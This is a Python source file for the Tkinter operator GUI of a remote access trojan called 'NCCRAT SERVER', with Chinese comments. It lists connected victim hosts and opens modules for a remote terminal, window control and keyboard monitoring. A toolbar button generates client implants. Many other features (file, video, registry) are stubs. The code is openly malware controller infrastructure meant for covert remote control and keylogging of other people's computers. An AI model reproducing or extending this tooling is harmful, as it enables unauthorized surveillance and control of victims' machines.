'''
Autheor: JFSAS
Date: 2024-12-4 23:02:00
Description: gui界面
'''
import tkinter as tk
from tkinter import ttk, Menu, Toplevel, messagebox, scrolledtext
from server import RAT_SERVER
import threading
import queue
from modules.generate_client_demo import generate_client
from modules.terminal import Terminal
from modules.window import WindowManager
from modules.keyboard import Keyboard
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

class ratGUI:
    """
    RAT GUI
    
    """
    def __init__(self, root, server : RAT_SERVER):
        self.root = root
        self.server = server
        self.server.root = self.root
        self.server.on_client_connected = self.add_client_to_table
        self.server.on_client_disconnected = self.remove_client_from_table
        self.root.title("NCCRAT SERVER")
        self.current_client = None
        self.create_menu()
        self.create_toolbar()
        self.create_table()
        self.create_status_bar()
        self.create_log()
        self.msg_queue = queue.Queue()
        self.run_gui()

    
    def run_gui(self):
        '''
        运行gui
        '''
        # 进入after的循环：从msg_queue中取出一个元素，插入到client列表中
        self.handle_msg_queue()
        # 等待连接
        self.start_connection_thread()
        self.root.mainloop()
        
    def handle_msg_queue(self):
        '''
        处理msg_queue
        '''
        while not self.msg_queue.empty():
            addr = self.msg_queue.get()
            self.add_client_to_table(*addr)
        self.root.after(1000, self.handle_msg_queue)

    def create_menu(self):
        '''
        创建菜单
        '''
        menu_bar = Menu(self.root)
        self.root.config(menu=menu_bar)

        # 菜单示例
        file_menu = Menu(menu_bar, tearoff=0)
        file_menu.add_command(label="退出", command=self.root.quit)
        menu_bar.add_cascade(label="菜单(F)", menu=file_menu)

    def create_toolbar(self):
        '''
        创建工具栏
        '''
        toolbar = tk.Frame(self.root, bd=1, relief=tk.RAISED)

        # 工具按钮
        buttons = [
            ("终端管理", self.terminal_management),
            ("进程管理", self.process_management),
            ("窗口管理", self.window_management),
            ("键盘管理", self.keyboard_management),
            ("文件管理", self.file_management),
            ("语言管理", self.language_management),
            ("视频管理", self.video_management),
            ("服务管理", self.service_management),
            ("注册表管理", self.registry_management),
            ("参数设置", self.settings),
            ("生成服务端", self.generate_server),
            ("帮助", self.help)
        ]
        for (text, command) in buttons:
            btn = tk.Button(toolbar, text=text, relief=tk.FLAT, padx=5, pady=2, command=command)
            btn.pack(side=tk.LEFT, padx=2, pady=2)

        toolbar.pack(side=tk.TOP, fill=tk.X)


    def create_table(self):
        '''
        创建client列表
        '''
        
        columns = ("IP", "端口", "计算机名/备注", "操作系统", "CPU", "摄像头", "PING")
        self.tree = ttk.Treeview(self.root, columns=columns, show="headings")
        self.tree.pack(fill=tk.BOTH, expand=True)

        # 设置列标题
        for col in columns:
            self.tree.heading(col, text=col)
            self.tree.column(col, width=100, anchor=tk.CENTER)
        
        #点击事件
        self.tree.bind("<ButtonRelease-1>", self.on_tree_item_click)
        #右键
        self.tree.bind("<Button-3>", self.on_tree_item_popup)
    
    def create_log(self):
        '''
        创建日志栏
        '''
        self.log_frame = tk.Frame(self.root)
        self.log_frame.pack(side=tk.BOTTOM, fill=tk.BOTH, expand=True)
        self.log_text = scrolledtext.ScrolledText(self.log_frame, state='disabled', height=10)
        self.log_text.pack(fill=tk.BOTH, expand=True)        

    def on_tree_item_popup(self, event):
        '''
        右键菜单
        '''
        selected_item = self.tree.identify_row(event.y)
        item_values = self.tree.item(selected_item, "values")
        ip = item_values[0]
        port = item_values[1]
        menu = Menu(self.root, tearoff=0)
        menu.add_command(label="删除", command=self.remove_client)
        if selected_item:
            self.tree.selection_set(selected_item)
            menu.post(event.x_root, event.y_root)
            

    def on_tree_item_click(self, event):
        '''
        client列表点击事件
        '''
        selected_item = self.tree.selection()[0]
        item_values = self.tree.item(selected_item, "values")
        ip = item_values[0]
        port = item_values[1]
        # 切换当前客户端
        self.current_client = self.server.get_client(ip, port)
        
    
        
    def add_client_to_table(self, ip: str, addr: int):
        '''
        server回调函数，添加客户端到client列表
        Params:
            ip: 客户端ip
            addr: 客户端地址(ip, port)
        '''
        try:
            self.tree.insert("", tk.END, values=(ip, str(addr), "未知", "未知", "未知", "未知", "未知"))
            self.client_num += 1
            self.status_bar.config(text=f"有{self.client_num}个主机在线")
            self.log_message(f"主机{ip}已连接")
            # logging.debug(f"Successfully inserted client with IP: {ip}")
        except Exception as e:
            logging.error(f"Error inserting into tree: {e}")
    
    
    def remove_client(self):
        '''
        主动删除连接的客户端
        Params:
            ip: 客户端ip
            addr: 客户端地址(ip, port)
        '''
        selected_item = self.tree.selection()[0]
        item_values = self.tree.item(selected_item, "values")
        ip = item_values[0]
        port = item_values[1]
        self.server.close_client(ip, port)
        self.remove_client_from_table(ip, port)
    
    def remove_client_from_table(self, ip, addr):
        '''
        server回调函数，删除client列表中的客户端
        Params:
            ip: 客户端ip
            addr: 客户端地址(ip, port)
        '''
        for item in self.tree.get_children():
            item_values = self.tree.item(item, "values")
            if item_values[0] == ip and item_values[1] == addr:
                self.tree.delete(item)
                self.client_num -= 1
                self.status_bar.config(text=f"有{self.client_num}个主机在线")
                self.log_message(f"主机{ip}已断开")
                break
    
    def log_message(self, message: str):
        '''
        添加log信息
        Params:
            message: log信息
        '''
        self.log_text.config(state='normal')
        self.log_text.insert(tk.END, message + '\n')
        self.log_text.config(state='disabled')
        self.log_text.yview(tk.END)
    
    def create_status_bar(self):
        '''
        创建左下状态栏
        '''
        self.client_num = 0
        self.status_bar = tk.Label(self.root, text="无主机在线", bd=1, relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
            
    def start_connection_thread(self):
        '''
        开启server线程
        '''
        connection_thread = threading.Thread(target=self.server.build_connection, args=(self.msg_queue,))
        connection_thread.daemon = True
        connection_thread.start()
        self.log_message("等待客户端连接...")
        
    def terminal_management(self):
        '''
        终端管理
        '''
        if self.current_client is None:
            messagebox.showerror("错误", "请先选择一个客户端")
            return
        Terminal(self.root, *self.current_client)
        
    def generate_server(self):
        generate_client(self.root)
        
    def process_management(self):
        messagebox.showinfo("进程管理", "进程管理功能")

    def window_management(self):
        '''
        窗口管理
        '''
        if self.current_client is None:
            messagebox.showerror("错误", "请先选择一个客户端")
            return
        WindowManager(self.root, self.current_client)
        
    def keyboard_management(self):
        '''
        键盘监控
        '''
        if self.current_client is None:
            messagebox.showerror("错误", "请先选择一个客户端")
            return
        Keyboard(self.root, *self.current_client) # *解包成socket和两个queue

    def desktop_management(self):
        messagebox.showinfo("桌面管理", "桌面管理功能")

    def file_management(self):
        messagebox.showinfo("文件管理", "文件管理功能")

    def language_management(self):
        messagebox.showinfo("语言管理", "语言管理功能")

    def video_management(self):
        messagebox.showinfo("视频管理", "视频管理功能")

    def service_management(self):
        messagebox.showinfo("服务管理", "服务管理功能")

    def registry_management(self):
        messagebox.showinfo("注册表管理", "注册表管理功能")

    def settings(self):
        messagebox.showinfo("settings", "settings")
        
    def help(self):
        messagebox.showinfo("帮助", "帮助功能")






if __name__ == "__main__":
    rat = RAT_SERVER("127.0.0.1", 4444)
    # rat = RAT_SERVER("10.211.55.2", 4444)
    root = tk.Tk()
    root.geometry("800x600")
    app = ratGUI(root, rat)
    